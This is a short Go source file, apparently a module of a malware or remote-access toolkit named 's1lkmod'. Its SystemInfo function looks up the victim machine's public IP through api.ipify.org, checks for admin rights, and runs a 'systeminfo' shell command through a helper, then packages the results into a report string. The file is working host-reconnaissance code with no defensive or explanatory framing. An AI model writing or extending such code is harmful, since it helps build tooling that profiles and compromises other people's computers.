package info_gather

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"s1lkmod/pkg/modules/cmd"
)

func SystemInfo() string {
	resp, _ := http.Get("https://api.ipify.org") // Sends a GET request to the website
	body, _ := ioutil.ReadAll(resp.Body)         // Reads the body
	ipAddress := string(body)
	resp.Body.Close()
	result := fmt.Sprintf("IP Address: %s\nAdmin: %t\n%s", ipAddress, checkifAdmin(), cmd.Arkor("systeminfo | findstr /C:OS"))
	return result

}
